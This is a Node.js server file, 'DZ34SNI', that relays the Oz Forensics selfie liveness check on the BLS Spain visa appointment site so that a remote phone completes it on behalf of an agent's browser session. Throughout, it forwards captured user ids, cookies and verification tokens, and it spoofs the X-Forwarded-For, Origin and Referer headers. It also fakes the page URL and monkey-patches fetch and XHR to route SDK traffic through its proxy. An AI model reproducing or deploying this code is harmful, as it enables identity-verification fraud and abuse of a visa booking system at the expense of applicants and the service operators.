/**
 * DZ34SNI Server v3.0 — WITH OZ PROXY
 * Deploy on Render: https://dz34sni-26.onrender.com
 * 
 * NEW: /oz-proxy/* endpoint that proxies ALL requests to ozforensics.com
 * and injects the Agent's real IP as X-Forwarded-For.
 * This way, OZ sees the Agent's IP, not the Client's phone IP.
 * 
 * Flow:
 * 1. Extension (agent) captures userId + transactionId from BLS liveness page
 * 2. Extension POSTs task to /task/:phone (includes agent's realIp)
 * 3. APK (client) polls GET /task/:phone → receives task
 * 4. APK navigates to GET /oz-page → loads OZ SDK through our proxy
 * 5. ALL OZ SDK requests (JS, API, video upload) go through /oz-proxy/*
 * 6. Server proxies to ozforensics.com with X-Forwarded-For = agent IP
 * 7. APK POSTs result to /result/:phone
 * 8. Extension polls GET /result/:phone → gets event_session_id → injects
 */

const express = require('express');
const cors = require('cors');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Increase raw body for proxy
app.use('/oz-proxy', express.raw({ type: '*/*', limit: '50mb' }));

// Request logging
app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    const path = req.path.length > 80 ? req.path.substring(0, 80) + '...' : req.path;
    console.log(`[${ts}] ${req.method} ${path}`);
    next();
});

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
// tasks[phone] = { userId, transactionId, realIp, cookies, userAgent, pageUrl, verificationToken, timestamp }
const tasks = {};
// results[phone] = { event_session_id, status, realIp, timestamp }
const results = {};
// ipMap[phone] = agentIp — stores agent IP per phone for proxy use
const ipMap = {};

// Auto-cleanup: remove entries older than 30 minutes
setInterval(() => {
    const now = Date.now();
    const MAX_AGE = 30 * 60 * 1000;
    for (const phone in tasks) {
        if (now - (tasks[phone].timestamp || 0) > MAX_AGE) {
            delete tasks[phone];
            delete ipMap[phone];
            console.log(`[CLEANUP] Task removed: ${phone}`);
        }
    }
    for (const phone in results) {
        if (now - (results[phone].timestamp || 0) > MAX_AGE) {
            delete results[phone];
            console.log(`[CLEANUP] Result removed: ${phone}`);
        }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// ROUTES: TASK (Extension → APK)
// ═══════════════════════════════════════════

app.post('/task/:phone', (req, res) => {
    const phone = req.params.phone;
    const body = req.body || {};
    
    if (!body.userId || !body.transactionId) {
        return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
    }

    tasks[phone] = {
        userId: body.userId,
        transactionId: body.transactionId,
        realIp: body.realIp || '',
        cookies: body.cookies || '',
        userAgent: body.userAgent || '',
        pageUrl: body.pageUrl || '',
        verificationToken: body.verificationToken || '',
        timestamp: body.timestamp || Date.now()
    };

    // Store agent IP for proxy
    if (body.realIp) {
        ipMap[phone] = body.realIp;
    }

    console.log(`[TASK] 📥 ${phone}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'}`);
    res.json({ ok: true });
});

app.get('/task/:phone', (req, res) => {
    const phone = req.params.phone;
    const task = tasks[phone];
    if (task) {
        console.log(`[TASK] 📤 ${phone}: sending task`);
        res.json({ ok: true, task: task });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: RESULT (APK → Extension)
// ═══════════════════════════════════════════

app.post('/result/:phone', (req, res) => {
    const phone = req.params.phone;
    const body = req.body || {};

    if (!body.event_session_id) {
        return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
    }

    results[phone] = {
        event_session_id: body.event_session_id,
        status: body.status || 'completed',
        realIp: body.realIp || ipMap[phone] || '',
        timestamp: body.timestamp || Date.now()
    };

    delete tasks[phone];

    console.log(`[RESULT] ✅ ${phone}: session=${body.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:phone', (req, res) => {
    const phone = req.params.phone;
    const result = results[phone];
    if (result) {
        console.log(`[RESULT] 📤 ${phone}: sending result`);
        res.json({ ok: true, result: result });
    } else {
        res.json({ ok: false, result: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:phone', (req, res) => {
    const phone = req.params.phone;
    delete tasks[phone];
    delete results[phone];
    delete ipMap[phone];
    console.log(`[CLEAR] 🗑️ ${phone}`);
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ PROXY — THE KEY FEATURE
// ═══════════════════════════════════════════
/**
 * /oz-proxy/:phone/* 
 * 
 * Proxies ANY request to ozforensics.com domains.
 * Adds X-Forwarded-For header with the agent's IP (stored in ipMap[phone]).
 * 
 * Example:
 *   GET /oz-proxy/0555123456/web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php
 *   → GET https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php
 *     with X-Forwarded-For: <agent_ip>
 */
app.all('/oz-proxy/:phone/*', (req, res) => {
    const phone = req.params.phone;
    const agentIp = ipMap[phone] || '';
    
    // Extract the target URL from the path after /oz-proxy/:phone/
    // The path looks like: /oz-proxy/PHONE/hostname/path/to/resource
    const afterPrefix = req.params[0]; // everything after /oz-proxy/:phone/
    
    if (!afterPrefix) {
        return res.status(400).json({ ok: false, error: 'Missing target URL' });
    }
    
    // Reconstruct the full target URL
    // afterPrefix = "web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"
    const targetUrl = 'https://' + afterPrefix + (req._parsedUrl.search || '');
    
    console.log(`[OZ-PROXY] ${req.method} → ${targetUrl.substring(0, 100)} (IP: ${agentIp || 'none'})`);
    
    // Security: only allow ozforensics.com domains
    let parsedUrl;
    try {
        parsedUrl = new URL(targetUrl);
    } catch(e) {
        return res.status(400).json({ ok: false, error: 'Invalid URL' });
    }
    
    if (!parsedUrl.hostname.includes('ozforensics.com')) {
        return res.status(403).json({ ok: false, error: 'Only ozforensics.com domains allowed' });
    }
    
    // Build proxy request headers
    const proxyHeaders = {};
    
    // Copy relevant headers from client request
    const copyHeaders = ['content-type', 'accept', 'accept-language', 'accept-encoding'];
    for (const h of copyHeaders) {
        if (req.headers[h]) proxyHeaders[h] = req.headers[h];
    }
    
    // Set the critical headers
    proxyHeaders['Host'] = parsedUrl.hostname;
    proxyHeaders['Origin'] = 'https://algeria.blsspainglobal.com';
    proxyHeaders['Referer'] = 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest';
    proxyHeaders['User-Agent'] = req.headers['user-agent'] || 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0';
    
    // THE KEY: Set X-Forwarded-For to agent's IP
    if (agentIp) {
        proxyHeaders['X-Forwarded-For'] = agentIp;
        proxyHeaders['X-Real-IP'] = agentIp;
    }
    
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: req.method,
        headers: proxyHeaders,
        timeout: 60000
    };
    
    const proxyReq = https.request(options, (proxyRes) => {
        // Copy response headers (except some problematic ones)
        const skipHeaders = ['transfer-encoding', 'content-encoding', 'connection', 'keep-alive'];
        for (const [key, value] of Object.entries(proxyRes.headers)) {
            if (!skipHeaders.includes(key.toLowerCase())) {
                // Fix CORS - allow our server
                if (key.toLowerCase() === 'access-control-allow-origin') {
                    res.setHeader(key, '*');
                } else {
                    res.setHeader(key, value);
                }
            }
        }
        
        // Always set CORS headers
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', '*');
        
        res.status(proxyRes.statusCode);
        proxyRes.pipe(res);
    });
    
    proxyReq.on('error', (err) => {
        console.error(`[OZ-PROXY] Error: ${err.message}`);
        res.status(502).json({ ok: false, error: 'Proxy error: ' + err.message });
    });
    
    proxyReq.on('timeout', () => {
        proxyReq.destroy();
        res.status(504).json({ ok: false, error: 'Proxy timeout' });
    });
    
    // Forward request body
    if (req.method !== 'GET' && req.method !== 'HEAD') {
        if (Buffer.isBuffer(req.body)) {
            proxyReq.write(req.body);
        } else if (req.body && typeof req.body === 'object') {
            proxyReq.write(JSON.stringify(req.body));
        }
    }
    
    proxyReq.end();
});

// Handle CORS preflight for proxy
app.options('/oz-proxy/:phone/*', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(204).end();
});

// ═══════════════════════════════════════════
// ROUTE: OZ-PAGE (with proxy rewriting)
// ═══════════════════════════════════════════

app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, phone } = req.query;
    
    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = escJs(userId);
    const tid = escJs(transactionId);
    const ip = escJs(realIp);
    const ph = escJs(phone);
    // Server base URL (auto-detect from request)
    const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'dz34sni-26.onrender.com';
    const serverBase = `${proto}://${host}`;
    const proxyBase = `${serverBase}/oz-proxy/${encodeURIComponent(phone || '')}`;

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness Check</title>
<style>
body { margin: 0; background: #fff; font-family: 'Segoe UI', Arial, sans-serif; }
#st {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: rgba(0,0,0,.85); color: #fff; padding: 12px 24px; border-radius: 10px;
    font-size: 14px; z-index: 99999; text-align: center; font-weight: 600;
    box-shadow: 0 4px 20px rgba(0,0,0,.3);
}
</style>
</head>
<body>
<div id="oz-container"></div>
<div id="st">Chargement SDK via proxy...</div>

<!-- URL bar spoof -->
<script>
try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(e) {}
</script>

<!-- ═══ CRITICAL: Intercept ALL fetch/XHR to route ozforensics.com through our proxy ═══ -->
<script>
(function(){
    var PROXY_BASE = '${proxyBase}';
    var PHONE = '${ph}';
    var REAL_IP = '${ip}';
    
    console.log('[DZ34SNI] Proxy base:', PROXY_BASE);
    console.log('[DZ34SNI] Agent IP:', REAL_IP);
    
    // Helper: rewrite ozforensics URL to go through our proxy
    function rewriteUrl(url) {
        if (typeof url !== 'string') return url;
        
        // Match any ozforensics.com URL
        // https://something.ozforensics.com/path → PROXY_BASE/something.ozforensics.com/path
        var match = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
        if (match) {
            var newUrl = PROXY_BASE + '/' + match[1] + match[2];
            console.log('[DZ34SNI-PROXY] Rewrite:', url.substring(0, 60), '→ proxy');
            return newUrl;
        }
        return url;
    }
    
    // ═══ Patch fetch ═══
    var _fetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
        var newUrl = rewriteUrl(url);
        
        if (newUrl !== url) {
            // If it was a Request object, recreate with new URL
            if (typeof input !== 'string' && input instanceof Request) {
                input = new Request(newUrl, input);
            } else {
                input = newUrl;
            }
        }
        
        return _fetch.call(this, input, init);
    };
    
    // ═══ Patch XMLHttpRequest ═══
    var _xhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var newUrl = rewriteUrl(url);
        arguments[1] = newUrl;
        return _xhrOpen.apply(this, arguments);
    };
    
    // ═══ Patch createElement for script tags ═══
    var _createElement = document.createElement.bind(document);
    document.createElement = function(tag) {
        var el = _createElement(tag);
        if (tag.toLowerCase() === 'script') {
            var _srcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src') || 
                           Object.getOwnPropertyDescriptor(el.__proto__, 'src');
            if (_srcDesc && _srcDesc.set) {
                Object.defineProperty(el, 'src', {
                    get: function() { return _srcDesc.get.call(this); },
                    set: function(val) {
                        var newVal = rewriteUrl(val);
                        return _srcDesc.set.call(this, newVal);
                    },
                    configurable: true,
                    enumerable: true
                });
            }
        }
        if (tag.toLowerCase() === 'link') {
            var _hrefDesc = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href') ||
                            Object.getOwnPropertyDescriptor(el.__proto__, 'href');
            if (_hrefDesc && _hrefDesc.set) {
                Object.defineProperty(el, 'href', {
                    get: function() { return _hrefDesc.get.call(this); },
                    set: function(val) {
                        var newVal = rewriteUrl(val);
                        return _hrefDesc.set.call(this, newVal);
                    },
                    configurable: true,
                    enumerable: true
                });
            }
        }
        return el;
    };
    
    // ═══ Patch Image constructor for tracking pixels ═══
    var _Image = window.Image;
    window.Image = function(w, h) {
        var img = new _Image(w, h);
        var _srcDesc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
        if (_srcDesc && _srcDesc.set) {
            Object.defineProperty(img, 'src', {
                get: function() { return _srcDesc.get.call(this); },
                set: function(val) {
                    return _srcDesc.set.call(this, rewriteUrl(val));
                },
                configurable: true,
                enumerable: true
            });
        }
        return img;
    };
    window.Image.prototype = _Image.prototype;
    
    // ═══ Patch WebSocket if OZ uses it ═══
    var _WebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        // Can't proxy WebSocket through HTTP, but log it
        console.log('[DZ34SNI] WebSocket:', url);
        return new _WebSocket(url, protocols);
    };
    window.WebSocket.prototype = _WebSocket.prototype;
    
    console.log('[DZ34SNI] ✅ All network interceptors installed - routing through proxy');
})();
</script>

<!-- Form for compatibility -->
<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
    <input type="hidden" name="__RequestVerificationToken" value="">
</form>

<!-- Load OZ SDK THROUGH PROXY -->
<script src="${proxyBase}/web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>

<!-- Launch liveness after SDK loads -->
<script>
window.addEventListener('load', function() {
    document.getElementById('st').textContent = 'Lancement...';
    setTimeout(function() {
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'SDK non chargé - verifiez proxy';
                if (window.Android) window.Android.onSelfieError('SDK not loaded');
                if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('SDK not loaded');
                return;
            }
            document.getElementById('st').textContent = 'Démarrage selfie...';
            OzLiveness.open({
                lang: 'en',
                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
                overlay_options: false,
                action: ['video_selfie_blank'],
                result_mode: 'safe',
                on_complete: function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        document.getElementById('st').textContent = '✅ Selfie OK! Envoi...';
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                        
                        // Send result to server
                        var PHONE = '${ph}';
                        var SERVER = '${serverBase}';
                        fetch(SERVER + '/result/' + encodeURIComponent(PHONE), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                event_session_id: sid,
                                status: 'completed',
                                realIp: '${ip}',
                                timestamp: Date.now()
                            })
                        }).then(function() {
                            document.getElementById('st').textContent = '✅ Selfie envoyé!';
                            if (window.Android) window.Android.onSelfieComplete(sid);
                            if (window.__dz34sni_bridge) {
                                window.__dz34sni_bridge.onResult(sid);
                                setTimeout(function() { window.__dz34sni_bridge.onGoHome(); }, 3000);
                            }
                        }).catch(function(e) {
                            document.getElementById('st').textContent = '⚠️ Selfie OK mais erreur envoi';
                            if (window.Android) window.Android.onSelfieComplete(sid);
                            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onResult(sid);
                        });
                    } else {
                        document.getElementById('st').textContent = 'Pas de session ID';
                        if (window.Android) window.Android.onSelfieError('No session ID');
                        if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('No session ID');
                    }
                },
                on_error: function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                    if (window.Android) window.Android.onSelfieError(msg);
                    if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(msg);
                }
            });
        } catch(x) {
            document.getElementById('st').textContent = 'Erreur: ' + x.message;
            if (window.Android) window.Android.onSelfieError(x.message);
            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(x.message);
        }
    }, 3000);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH & STATUS
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: 'DZ34SNI',
        version: '3.0-PROXY',
        status: 'running',
        features: ['oz-proxy', 'ip-spoofing'],
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        activeIpMaps: Object.keys(ipMap).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ ok: true, timestamp: Date.now() });
});

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(p => ({ 
            phone: p, 
            userId: (tasks[p].userId || '').substring(0, 10) + '...', 
            realIp: tasks[p].realIp || 'none',
            age: Math.floor((Date.now() - tasks[p].timestamp) / 1000) + 's' 
        })),
        results: Object.keys(results).map(p => ({ 
            phone: p, 
            sessionId: (results[p].event_session_id || '').substring(0, 10) + '...', 
            age: Math.floor((Date.now() - results[p].timestamp) / 1000) + 's' 
        })),
        ipMap: Object.keys(ipMap).map(p => ({
            phone: p,
            agentIp: ipMap[p]
        }))
    });
});

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
app.listen(PORT, () => {
    console.log(`\n🐉 DZ34SNI Server v3.0 — WITH OZ PROXY`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Proxy: /oz-proxy/:phone/* → ozforensics.com`);
    console.log(`   Ready!\n`);
});
